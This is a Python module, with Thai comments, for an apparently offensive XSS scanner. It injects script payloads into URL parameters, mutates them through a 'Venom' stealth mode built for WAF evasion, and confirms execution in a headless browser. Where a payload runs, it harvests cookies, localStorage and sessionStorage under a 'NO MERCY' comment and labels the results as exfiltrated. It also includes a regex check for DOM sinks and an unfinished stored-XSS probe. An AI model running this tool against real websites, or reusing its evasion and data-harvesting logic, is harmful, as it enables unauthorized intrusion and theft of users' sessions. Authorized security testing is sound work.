import aiohttp
import asyncio
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from playwright.async_api import async_playwright

# Payloads ที่เน้นการ Execute Code จริงๆ
# เราจะพยายามเขียนค่าลง window property เพื่อให้ Playwright เช็คได้ง่ายๆ
XSS_PAYLOADS = [
    # Basic Script Injection
    '"><script>window.hacked=1</script>',
    # Event Handler Injection
    '" onmouseover="window.hacked=1" autofocus onfocus="window.hacked=1',
    # Image Error Injection
    '<img src=x onerror=window.hacked=1>'
]

async def verify_xss_with_browser(url, headers=None):
    """ ใช้ Headless Browser ตรวจสอบและดูดข้อมูล """
    try:
        async with async_playwright() as p:
            # Prepare context options
            context_args = {"ignore_https_errors": True}
            if headers:
                # Separate User-Agent if present
                h_copy = headers.copy()
                if 'User-Agent' in h_copy:
                    context_args['user_agent'] = h_copy.pop('User-Agent')
                if 'user-agent' in h_copy: # Case insensitive check
                    context_args['user_agent'] = h_copy.pop('user-agent')
                context_args['extra_http_headers'] = h_copy

            # เปิด Browser แบบปิดตา (Headless) แต่ถ้าอยากเห็นก็แก้ headless=False
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(**context_args)
            page = await context.new_page()
            
            # ไปที่ URL ที่มี Payload
            try:
                await page.goto(url, timeout=10000, wait_until="domcontentloaded")
            except Exception: pass # บางทีหน้าเว็บโหลดไม่เสร็จแต่ Script รันแล้วก็มี

            # 1. ตรวจสอบว่า Script รันหรือไม่ (เช็คตัวแปร window.hacked)
            is_executed = await page.evaluate("() => window.hacked === 1")
            
            evidence_data = ""
            if is_executed:
                # 2. [NO MERCY] ถ้า Script รันได้ ให้ดูดข้อมูลทันที!
                cookies = await context.cookies()
                local_storage = await page.evaluate("() => JSON.stringify(localStorage)")
                session_storage = await page.evaluate("() => JSON.stringify(sessionStorage)")
                dom_snippet = await page.evaluate("() => document.body.innerText.substring(0, 200)")

                evidence_data += f"[EXFILTRATED COOKIES]\n{cookies}\n\n"
                evidence_data += f"[LOCAL STORAGE]\n{local_storage}\n\n"
                evidence_data += f"[DOM PREVIEW]\n{dom_snippet}..."
                
                await browser.close()
                return True, evidence_data
            
            await browser.close()
    except Exception as e:
        # print(f"Browser Error: {e}")
        pass
        
    return False, None

import re

# ... (Previous Code) ...

async def check_dom_xss(session, url):
    """
    Checks for DOM-Based XSS by analyzing client-side JavaScript for dangerous sinks.
    """
    findings = []
    try:
        async with session.get(url, timeout=10, ssl=False) as resp:
            text = await resp.text()

            # Dangerous Sinks
            sinks = [
                "innerHTML", "outerHTML", "document.write", 
                "document.writeln", "eval", "setTimeout", "setInterval"
            ]
            
            # User Input Sources
            sources = [
                "location.hash", "location.search", "location.href", 
                "document.referrer", "window.name"
            ]
            
            # Simple Regex to find Sink = Source pattern
            # e.g., document.getElementById('x').innerHTML = location.hash
            
            for sink in sinks:
                for source in sources:
                    # Regex: sink...source (simplified)
                    # We look for sink assignment involving source
                    # Risk: High False Positive, but good enough for static analysis hint
                    pattern = f"{sink}.*{source}" 
                    if re.search(pattern, text, re.IGNORECASE):
                         findings.append({
                            "type": "DOM-Based XSS (Sink Analysis)",
                            "severity": "High",
                            "detail": f"Potential unsafe data flow from '{source}' to '{sink}'.",
                            "evidence": f"Match: {sink} ... {source}\nURL: {url}",
                            "remediation": "Avoid using dangerous sinks with untrusted input."
                        })
    except Exception: pass
    
    return findings

async def check_stored_xss(session, url, params, log_callback=None):
    """
    Probes for Stored XSS by injecting a canary and looking for it in responses.
    """
    findings = []
    
    # Canary Payload
    canary = "LOCKON_XSS_STORED_PROBE"
    payload = f"\"><script>print('{canary}')</script>"
    
    # 1. Inject (Blindly)
    for param_name in params:
        fuzzed_params = params.copy()
        fuzzed_params[param_name] = [payload]
        
        # Determine method (GET/POST). For now we assume query params -> GET 
        # But Stored XSS is usually POST. Ideally we need POST form support here.
        # This is a placeholder for future POST expansion.
        pass
        
    # [NOTE] Real Stored XSS requires:
    # 1. Inject payload via POST/PUT
    # 2. Visit other pages (or same page) to see if it reflects
    # Since this function is called per URL, we can only emit a "Probe" here.
    # A global "Verification" step would be needed to check *other* pages for the probe.
    
    return findings

from modules.payloads.venom import VenomMutation

async def check_xss(session, url, log_callback=None, headers=None, stealth_mode=False):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    # --- 1. DOM-Based XSS Check ---
    dom_findings = await check_dom_xss(session, url)
    findings.extend(dom_findings)

    if not params: return findings

    # [VENOM] Prepare Payloads
    target_payloads = XSS_PAYLOADS.copy()
    if stealth_mode:
        if log_callback: log_callback("   🐍 Venom Activated: Mutating XSS Payloads for WAF Evasion...")
        # Add Polyglots
        target_payloads.extend(VenomMutation.get_polyglots())
        # Mutate existing
        target_payloads = [VenomMutation.mutate_xss(p) for p in target_payloads]

    for param_name in params:
        for payload in target_payloads:
            fuzzed_params = params.copy()
            fuzzed_params[param_name] = [payload]
            target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
            
            # Step 2: Reflected XSS Fast Check (Static Analysis)
            try:
                async with session.get(target_url, timeout=5, ssl=False) as resp:
                    text = await resp.text()
                    # For mutated payloads, we can't search for exact string easily
                    # check for partial reflection or reliable triggers
                    if "script" not in payload and payload not in text: continue 
                    # If standard payload, check reflection
                    if not stealth_mode and payload not in text and "hacked" not in text:
                        continue 
            except Exception: continue

            # Step 3: Active Verification (Playwright)
            if log_callback: log_callback(f"   Potential XSS on '{param_name}'. Verifying & Exfiltrating with Browser...")
            is_vuln, evidence = await verify_xss_with_browser(target_url, headers=headers)
            
            if is_vuln:
                findings.append({
                    "type": "Reflected XSS (Verified & Exfiltrated)",
                    "severity": "High",
                    "detail": f"Payload executed successfully on parameter '{param_name}'. Sensitive browser data extracted.",
                    "evidence": f"Payload: {payload}\n\n{evidence}",
                    "remediation": "Context-aware output encoding is required."
                })
                # If one works, usually enough for this param
                break 

    return findings

async def run_xss_scan(target_url, log_callback=None, headers=None, stealth_mode=False):
    findings = []
    if log_callback: log_callback(f"🎭 Starting Active XSS Verification on {target_url}...")
    
    async with aiohttp.ClientSession(headers=headers) as session:
        findings = await check_xss(session, target_url, log_callback, headers=headers, stealth_mode=stealth_mode)
        
    return findings